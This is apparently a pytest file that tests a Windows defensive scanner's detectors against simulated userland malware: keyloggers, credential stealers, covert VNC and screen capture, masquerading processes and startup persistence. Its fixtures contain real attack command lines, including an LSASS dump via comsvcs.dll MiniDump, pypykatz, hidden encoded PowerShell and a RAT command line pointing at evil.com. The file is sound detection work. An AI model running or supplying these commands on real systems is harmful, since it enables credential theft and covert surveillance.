"""
Tests for Simulated User-Mode (Ring 3) Applications and Threats.

Simulates real-world userland malware behavior:
1. User-mode keylogger (polling GetAsyncKeyState / WH_KEYBOARD_LL hook)
2. User-mode credential stealer (dumping tools, LOLBAS comsvcs.dll)
3. User-mode covert surveillance (desktop GDI screen capture, hidden VNC)
4. User-mode process masquerading & packed binary in %APPDATA%
5. User-mode stealth autostart persistence in HKCU and user Startup folder
6. Comprehensive integrated multi-stage userland infection pipeline
"""

import os
import pytest
from scanner import SecurityScanner
from detectors.process_detector import ProcessDetector
from detectors.persistence_detector import PersistenceDetector
from detectors.keylogger_detector import KeyloggerDetector
from detectors.credential_theft_detector import CredentialTheftDetector
from detectors.surveillance_detector import SurveillanceDetector
from detectors.hidden_install_detector import HiddenInstallDetector


# =============================================================================
# 1. User-Mode Keylogger Application Simulation
# =============================================================================

def test_usermode_keylogger_application(mock_registry, tmp_path):
    """
    Simulates an active user-mode keylogger:
    - Userland process invoking keyboard hook functions
    - Persistence in HKCU Run pointing to user Temp directory
    - Loaded hook DLL module
    """
    keylogger_detector = KeyloggerDetector()
    persistence_detector = PersistenceDetector()

    # Configure mock registry for userland HKCU autostart
    mock_registry.store[("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run")] = [
        {"name": "UserModeKeylog", "data": r"C:\Users\Victim\AppData\Local\Temp\keylogger.exe", "type": 1}
    ]
    persistence_detector.registry_provider = mock_registry
    persistence_detector.service_provider = lambda: []
    persistence_detector.task_provider = lambda: []

    # Configure user-mode process with keyboard hook API invocation
    simulated_proc = [
        {
            "pid": 10420,
            "name": "keylogger.exe",
            "exe": r"C:\Users\Victim\AppData\Local\Temp\keylogger.exe",
            "cmdline": r"keylogger.exe --hook WH_KEYBOARD_LL --log C:\Users\Victim\AppData\Local\Temp\keys.log",
            "username": "DOMAIN\\VictimUser",
            "ppid": 10200
        }
    ]

    keylogger_detector.process_provider = lambda: simulated_proc
    # Mock loaded module for PID 10420
    keylogger_detector.enumerate_process_modules = lambda pid: [
        r"C:\Windows\System32\user32.dll",
        r"C:\Users\Victim\AppData\Local\Temp\keyboard_hook_x64.dll"
    ] if pid == 10420 else []

    # 1. Run Keylogger detector
    kl_findings = keylogger_detector.run()
    assert len(kl_findings) >= 2
    # Verify command line hook detected
    assert any("keyboard hook" in f["description"].lower() for f in kl_findings)
    # Verify loaded hook DLL detected
    assert any("keyboard_hook_x64.dll" in f["evidence"] for f in kl_findings)

    # 2. Run Persistence detector on userland HKCU entry
    persist_findings = persistence_detector.run()
    assert len(persist_findings) >= 1
    assert any(f["severity"] == "ALERT" and "user-writable" in f["description"].lower() for f in persist_findings)


# =============================================================================
# 2. User-Mode Credential Stealer Simulation
# =============================================================================

def test_usermode_credential_stealer_application():
    """
    Simulates a user-mode credential stealer:
    - Userland process invoking known dumping tools (pypykatz, procdump)
    - Process abusing comsvcs.dll MiniDump for credential dumping
    """
    cred_detector = CredentialTheftDetector()

    userland_processes = [
        {
            "pid": 11200,
            "name": "pypykatz.exe",
            "exe": r"C:\Users\Victim\AppData\Roaming\pypykatz.exe",
            "cmdline": r"pypykatz.exe live lsa",
            "username": "DOMAIN\\VictimUser",
            "ppid": 1000
        },
        {
            "pid": 11204,
            "name": "rundll32.exe",
            "exe": r"C:\Windows\System32\rundll32.exe",
            "cmdline": r"rundll32.exe C:\windows\system32\comsvcs.dll, #24 652 C:\Users\Victim\AppData\Local\Temp\dump.dmp full",
            "username": "DOMAIN\\VictimUser",
            "ppid": 11200
        }
    ]

    cred_detector.process_provider = lambda: userland_processes
    findings = cred_detector.run()

    assert len(findings) >= 2
    assert all(f["severity"] == "ALERT" for f in findings)
    assert any("pypykatz" in f["evidence"].lower() for f in findings)
    assert any("comsvcs" in f["evidence"].lower() for f in findings)


# =============================================================================
# 3. User-Mode Covert Surveillance Application Simulation
# =============================================================================

def test_usermode_surveillance_application():
    """
    Simulates user-mode surveillance tools:
    - Userland VNC server running without standard admin service installation
    - GDI desktop screen recorder process
    - User-level scheduled task for periodic screen grabbing
    """
    surveillance_detector = SurveillanceDetector()

    userland_surveillance_procs = [
        {
            "pid": 12100,
            "name": "winvnc.exe",
            "exe": r"C:\Users\Victim\AppData\Local\winvnc.exe",
            "cmdline": r"winvnc.exe -run -port 5900 -password covert",
            "username": "DOMAIN\\VictimUser",
            "ppid": 1000
        },
        {
            "pid": 12105,
            "name": "recorder.exe",
            "exe": r"C:\Users\Victim\AppData\Local\Temp\recorder.exe",
            "cmdline": r"recorder.exe --screen-capture --interval 5",
            "username": "DOMAIN\\VictimUser",
            "ppid": 12100
        }
    ]

    userland_tasks = [
        {
            "name": "UserAutoScreenshot",
            "task_to_run": r"powershell.exe -w hidden -c [System.Drawing.Graphics]::CopyFromScreen(0,0,0,0,$b.Size)",
            "author": "DOMAIN\\VictimUser"
        }
    ]

    surveillance_detector.process_provider = lambda: userland_surveillance_procs
    surveillance_detector.task_provider = lambda: userland_tasks
    surveillance_detector.service_provider = lambda: []

    findings = surveillance_detector.run()

    # VNC process should be flagged
    assert any("winvnc" in f["evidence"].lower() for f in findings)
    # Screen recorder process should be flagged
    assert any("recorder.exe" in f["evidence"].lower() for f in findings)
    # Screen grab scheduled task should be flagged as ALERT
    task_alerts = [f for f in findings if f["severity"] == "ALERT" and "screen capture" in f["description"].lower()]
    assert len(task_alerts) >= 1


# =============================================================================
# 4. User-Mode Process Masquerading & High Entropy Executable
# =============================================================================

def test_usermode_masquerading_and_packed_binary(high_entropy_file):
    """
    Simulates user-mode masquerading where a malware binary names itself 'svchost.exe'
    or typosquats 'svch0st.exe' in a user profile folder (%APPDATA%), packed with UPX.
    """
    process_detector = ProcessDetector()

    masquerading_user_procs = [
        {
            "pid": 13010,
            "name": "svchost.exe",
            "exe": high_entropy_file,  # High entropy packed binary (> 7.5)
            "cmdline": f'"{high_entropy_file}" -k netsvcs',
            "username": "DOMAIN\\VictimUser",
            "ppid": 1000
        },
        {
            "pid": 13020,
            "name": "svch0st.exe",  # Homoglyph typosquatting
            "exe": r"C:\Users\Victim\AppData\Roaming\svch0st.exe",
            "cmdline": r"C:\Users\Victim\AppData\Roaming\svch0st.exe",
            "username": "DOMAIN\\VictimUser",
            "ppid": 1000
        }
    ]

    process_detector.process_provider = lambda: masquerading_user_procs
    findings = process_detector.run()

    # 1. Canonical path masquerading alert for svchost.exe
    assert any("Process Masquerading" in f["description"] and "13010" in f["evidence"] for f in findings)

    # 2. High entropy packed binary alert
    assert any("high entropy" in f["description"].lower() and high_entropy_file in f["evidence"] for f in findings)

    # 3. Typosquatting alert for svch0st.exe
    assert any("lookalike" in f["description"].lower() and "svch0st.exe" in f["evidence"] for f in findings)


# =============================================================================
# 5. User-Mode Stealth Autostart Persistence
# =============================================================================

def test_usermode_stealth_autostart_persistence(tmp_path):
    """
    Simulates malware dropping an executable/script directly into the User Startup folder:
    C:\\Users\\<Victim>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\launcher.bat
    """
    persistence_detector = PersistenceDetector()

    user_startup_dir = tmp_path / "UserStartup"
    user_startup_dir.mkdir()

    # Malware dropped as a .bat or .ps1 in user startup
    dropped_script = user_startup_dir / "user_payload.bat"
    dropped_script.write_text("powershell -w hidden -enc JABiAGUAYQBjAG8AbgA=")

    dropped_vbs = user_startup_dir / "dropper.vbs"
    dropped_vbs.write_text('Set WshShell = CreateObject("WScript.Shell")')

    # Legitimate shortcut
    legit_shortcut = user_startup_dir / "OneDrive.lnk"
    legit_shortcut.write_bytes(b"\x4c\x00\x00\x00" + b"\x00" * 100)

    persistence_detector.startup_folders_override = [str(user_startup_dir)]
    persistence_detector.service_provider = lambda: []
    persistence_detector.task_provider = lambda: []

    findings = persistence_detector.run()

    # Both non-shortcut files must be flagged as ALERT
    alert_files = [f["evidence"] for f in findings if f["severity"] == "ALERT"]
    assert any("user_payload.bat" in ev for ev in alert_files)
    assert any("dropper.vbs" in ev for ev in alert_files)
    assert not any("OneDrive.lnk" in ev for ev in alert_files)


# =============================================================================
# 6. Integrated Multi-Stage User-Mode Malware Infection Pipeline
# =============================================================================

def test_usermode_full_infection_pipeline(tmp_path, mock_registry, high_entropy_file):
    """
    Full integrated scenario simulating a complete user-mode RAT / Stealer infection:
    - User Startup folder script dropped
    - HKCU Run key persistence to %TEMP%
    - Packed masquerading process in %APPDATA%
    - Keylogger process with hook command line
    - Active credential dumping via LOLBAS comsvcs.dll
    - Scheduled screenshot grabber task
    """
    log_file = tmp_path / "usermode_incident_log.txt"

    scanner = SecurityScanner(
        log_file=str(log_file),
        color_enabled=False,
        verbose=True
    )

    # 1. Setup mock user startup folder
    user_startup_dir = tmp_path / "Startup"
    user_startup_dir.mkdir()
    (user_startup_dir / "rat_loader.vbs").write_text("WScript.Sleep 5000")

    # 2. Setup mock registry for HKCU Run
    mock_registry.store[("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run")] = [
        {"name": "DiscordUpdate", "data": r"C:\Users\Victim\AppData\Local\Temp\rat_client.exe", "type": 1}
    ]

    # 3. Setup running user-mode processes
    active_user_procs = [
        {
            "pid": 15001,
            "name": "rat_client.exe",
            "exe": high_entropy_file,
            "cmdline": r"C:\Users\Victim\AppData\Local\Temp\rat_client.exe --c2-server evil.com --hook WH_KEYBOARD_LL",
            "username": "DOMAIN\\VictimUser",
            "ppid": 1000
        },
        {
            "pid": 15002,
            "name": "rundll32.exe",
            "exe": r"C:\Windows\System32\rundll32.exe",
            "cmdline": r"rundll32.exe C:\windows\system32\comsvcs.dll, #24 600 C:\Users\Victim\AppData\Local\Temp\lsass.dmp full",
            "username": "DOMAIN\\VictimUser",
            "ppid": 15001
        },
        {
            "pid": 15003,
            "name": "scvhost.exe",  # Typosquatting in userland
            "exe": r"C:\Users\Victim\AppData\Local\scvhost.exe",
            "cmdline": r"scvhost.exe -run",
            "username": "DOMAIN\\VictimUser",
            "ppid": 15001
        }
    ]

    # 4. Setup user scheduled task
    user_tasks = [
        {
            "name": "StealthScreenCapture",
            "task_to_run": r"powershell.exe -w hidden -c [System.Drawing.Graphics]::CopyFromScreen(0,0,0,0,$b.Size)",
            "author": "DOMAIN\\VictimUser"
        }
    ]

    # Inject telemetry into all scanner detectors
    for d in scanner.detectors:
        d.registry_provider = mock_registry
        d.process_provider = lambda: active_user_procs
        d.service_provider = lambda: []
        d.task_provider = lambda: user_tasks
        if isinstance(d, PersistenceDetector):
            d.startup_folders_override = [str(user_startup_dir)]

    # Execute full scan pipeline
    findings = scanner.run()

    # Validate that all user-mode attack techniques are flagged:
    categories = {f["category"] for f in findings}
    assert "Persistence" in categories
    assert "Process Spoofing / AV Evasion" in categories
    assert "Keylogging" in categories
    assert "Credential Theft" in categories
    assert "Covert Surveillance" in categories

    # Verify log output was written and contains findings
    assert log_file.is_file()
    log_content = log_file.read_text(encoding="utf-8")
    assert "WINDOWS DEFENSIVE SECURITY SCANNER - AUDIT LOG" in log_content
    assert "rat_client.exe" in log_content
    assert "comsvcs.dll" in log_content
    assert "scvhost.exe" in log_content
    assert "rat_loader.vbs" in log_content
